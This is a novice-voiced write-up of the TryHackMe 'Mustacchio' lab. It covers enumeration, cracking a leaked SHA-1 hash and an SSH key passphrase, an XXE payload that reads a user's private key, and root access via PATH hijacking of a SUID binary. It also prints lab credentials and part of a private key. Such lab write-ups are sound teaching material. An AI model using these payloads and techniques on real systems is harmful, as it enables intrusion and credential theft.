
# THM [Mustacchio](#https://tryhackme.com/r/room/mustacchio) (Novice writeup) 
- **Description**: Easy boot2root Machine
- **Level**: easy
- **Category**: Web/Linux

### Note: This write-up is intended to simulate a lack of understanding of how actual hacking works you know kinda 'I have no idea'. LOL

## Hacking phases
- Reconnaissance
- Scanning and Enumeration
- Exploitation
- Post-Exploitation
- Covering Tracks
- Exfiltration
- Reporting

## Credentials
- **admin panel**: username: admin password: bulldog19
- **ssh user**: username: barry password: urieljames 

## Flags
- **User**: 62d77a4d5f9{REDACTED}b2651b831
- **Root**: 

## Recon
> the beginning of pentesting phase 
![recon](recon.png)


## Nmap tcp scanning
```bash
$ nmap -sC -sV -Pn --min-rate=1000 -T4 -p- mustacchio.thm -oN tcp.txt
...
Nmap scan report for mustacchio.thm (10.10.46.76)
Host is up (0.33s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.04 seconds
```

## Directory listing
```bash
gobuster dir -u http://mustacchio.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o /home/l0n3m4n/tools/ctf/thm/easy/mustacchio/gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/]
/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
/robots.txt           (Status: 200) [Size: 28]
/server-status        (Status: 403) [Size: 279]
Progress: 20476 / 20477 (100.00%)
===============================================================
Finished
===============================================================

```
## Hidden file
> always explore in hidden directories etc.
```bash
$ curl http://mustacchio.thm/custom/users.bak -o users.bak 

$ file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```
## SQLite3 
> if you dont know how it works do google search 
```bash 
$ sqlite3 users.bak 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
users

sqlite> SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Program interrupted.
```
## Checking hash type
> explore kali tools 
```bash
$ haiti "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b"
SHA-1 [HC: 100] [JtR: raw-sha1]
RIPEMD-160 [HC: 6000] [JtR: ripemd-160]
Double SHA-1 [HC: 4500]
Haval-160 (3 rounds) [JtR: dynamic_190]
Haval-160 (4 rounds) [JtR: dynamic_200]
Haval-160 (5 rounds) [JtR: dynamic_210]
HAS-160
LinkedIn [HC: 190] [JtR: raw-sha1-linkedin]
Skein-256(160)
Skein-512(160)
Ruby on Rails Restful Auth (one round, no sitekey) [HC: 27200]
MySQL5.x [HC: 300] [JtR: mysql-sha1]
MySQL4.1 [HC: 300] [JtR: mysql-sha1]
Umbraco HMAC-SHA1 [HC: 24800]
```
## Cracking hash
> just fucking search if you dont know how it works
```bash
$ hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
...
...

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:REDACTED        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
...
...
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6035.3 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 688128/14344385 (4.80%)
Rejected.........: 0/688128 (0.00%)
Restore.Point....: 681984/14344385 (4.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: carlock -> blah2007
Hardware.Mon.#1..: Temp: 52c Util: 21%
```
![admin-panel](admin-panel.png)

## Extracting another bak file
> found in view-source page and try to search curl cheatsheets
```bash
$ curl http://mustacchio.thm:8765/auth/dontforget.bak -o barry.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   996  100   996    0     0   1449      0 --:--:-- --:--:-- --:--:--  1451
                                                                                                                               
┌──(l0n3m4n㉿kali)-[~/…/ctf/thm/easy/mustacchio]
└─$ cat barry.bak                                                   
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>                                     
```
 
## What i did?
> If you get stuck, always ask ChatGPT it can give you a better understanding.
- **user**: determine a type of possible vulnerabilities.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com> </com>
</comment> 
```
- **chatgpt replies**: 
  - XML External Entity (XXE) Injection:
        If the XML parser is not configured securely, an attacker could add external entities that reference system files or remote resources. This can lead to information disclosure, remote code execution, or denial of service (DoS) attacks.
        To prevent XXE vulnerabilities, disable external entities in XML parsers.

  - Denial of Service (DoS) via XML Bombs:
        Recursive entity references (such as the "Billion Laughs" attack) can create large memory loads, causing the system to crash.
        Disabling external entities and implementing limits on the document size and recursion depth can help prevent this.

  - XPath Injection:
        If the XML is used with XPath queries, an attacker might craft queries that can lead to data leakage or bypass authentication.
        Sanitize XPath queries and consider using parameterized queries to mitigate this risk.
 
## XXE vulnerability payload
> found in ![hacktricks](#https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
> Burpsuite tutorial ![free course Udemy](#https://www.udemy.com/course/mastering-burp-suite/?srsltid=AfmBOorTKbmBVMgEXvSt9Fgo66sRaZCq2F65tdCL4CoaZ0EhqQrYSTxt)
![burp](burp.png)

## SSH Cracking
> googling, how to crack ssh key?
```bash
$ cat id_rsa      
 -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
... REDACTED
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
                                                                                        
┌──(l0n3m4n㉿kali)-[~/…/ctf/thm/easy/mustacchio]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(l0n3m4n㉿kali)-[~/…/ctf/thm/easy/mustacchio]
└─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)     
1g 0:00:00:00 DONE (2024-11-09 11:22) 1.818g/s 5401Kp/s 5401Kc/s 5401KC/s urielpoche1787..urielito1000
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
## SSH 
```bash
$ chmod 600 id_rsa 
$ ls -al id_rsa                     
-r-------- 1 l0n3m4n l0n3m4n 1766 Nov  9 11:28 id_rsa
                                                                                                                                                                          
┌──(l0n3m4n㉿kali)-[~/…/ctf/thm/easy/mustacchio]
└─$ ssh -i id_rsa barry@mustacchio.thm
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
...
...
barry@mustacchio:~$ 
```
## Privilege Escalation
> googling: privilege escalation using find 
- Since curl and wget are not working on the target machine, we can't transfer `LinPEAS` to the machine. Therefore, let's perform the transfer manually using `find`.
```bash
$ find / -type f -perm -u=s 2> /dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log # interesting
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su

$ file /home/joe/live_log
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped

$ barry@mustacchio:/home/joe$ ./live_log
10.2.4.61 - - [09/Nov/2024:04:37:51 +0000] "GET /home.php HTTP/1.1" 302 2005 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
10.2.4.61 - - [09/Nov/2024:04:37:52 +0000] "GET /index.php HTTP/1.1" 200 728 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"

^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 

```
## Investigating printable strings
```bash
$ barry@mustacchio:/home/joe$ strings live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log # interesting
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
... 
```
## Downloading binary
> try to search how to download binary files in target machine using linux tools. 
```bash
$ scp -i id_rsa barry@mustacchio.thm:/home/joe/live_log .
Enter passphrase for key 'id_rsa': 
live_log    
```
## checking binary in ghidra
> goto ghidra documentation it you get stuck
![ghidra](ghidra.png)

## Path Hijacking (Privilege escalation)
### Methodology 
**Question**: Since i'm f*cking noob, and I'm trying to understand how tail became a target for PATH hijacking, I wanted to figure out how to determine if a machine is vulnerable to it. So what I did, I checked in TryHackMe hint, and it pointed me towards a SUID (Set User ID) binary. That got me thinking what the heck is that, so I figured out by googling about [SUID privilege escalation](#https://www.prplbx.com/resources/blog/linux-privilege-escalation-with-path-variable-suid-bit/) but first I wanted to understand what is [PATH hijacking](#https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) anyway.

Here’s what I did:
  - First, I checked how the `tail -f /var/log/nginx/access.log` command works, so it is essentially monitors the NGINX log file in real-time every time we run the `live_log` binary it also a create file and append to current `access.log` file.

I now understand what is path hijacking we can create a file named tail that mimics the original binary and then prioritize it using `export PATH`. Here's the difference I observed: First, I tried using command `ls -al $(which tail)`, which showed tail in `/usr/bin/`. But after running `export PATH=/tmp:$PATH`, the command shows in `/tmp/tail` instead in `/usr/bin`. Could you confirm if I’m on the right track with this understanding? :( LOL!  

```bash 
# before 
$ barry@mustacchio:~$ ls -al $(which tail)
-rwxr-xr-x 1 root root 64432 Mar  2  2017 /usr/bin/tail

# after 
barry@mustacchio:~$ ls -al $(which tail)
-rwxrwxr-x 1 barry barry 13 Nov  9  /tmp/tail
```
## Path hijacking escalation command 
- create a similar filename tail in `tmp` folder
  - `echo /bin/bash -i > tail`
- Setting the PATH variable to prioritize /tmp:
  - `export PATH=/tmp:$PATH`
- changing permission to executable
  - `chmod +x tail`
- executing `live_log` binary 
  - `./home/live_log`  

## Behind the scene
```bash
barry@mustacchio:~$ ls
user.txt

barry@mustacchio:~$ cd /tmp

barry@mustacchio:/tmp$ ls

barry@mustacchio:/tmp$ echo /bin/bash -i > tail

barry@mustacchio:/tmp$ ls
tail

barry@mustacchio:/tmp$ cat tail
/bin/bash -i

barry@mustacchio:/tmp$ export PATH=/tmp:$PATH

barry@mustacchio:/tmp$ chmod +x tail

barry@mustacchio:/tmp$ ls -al
total 32
drwxrwxrwt  7 root  root  4096 Nov  9 05:27 .
drwxr-xr-x 24 root  root  4096 Nov  9 04:59 ..
drwxrwxrwt  2 root  root  4096 Nov  9 04:59 .font-unix
drwxrwxrwt  2 root  root  4096 Nov  9 04:59 .ICE-unix
-rwxrwxr-x  1 barry barry   13 Nov  9 05:27 tail
drwxrwxrwt  2 root  root  4096 Nov  9 04:59 .Test-unix
drwxrwxrwt  2 root  root  4096 Nov  9 04:59 .X11-unix
drwxrwxrwt  2 root  root  4096 Nov  9 04:59 .XIM-unix
barry@mustacchio:/tmp$ /home/joe/live_log

root@mustacchio:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)

root@mustacchio:/tmp# cat /root/root.txt
```
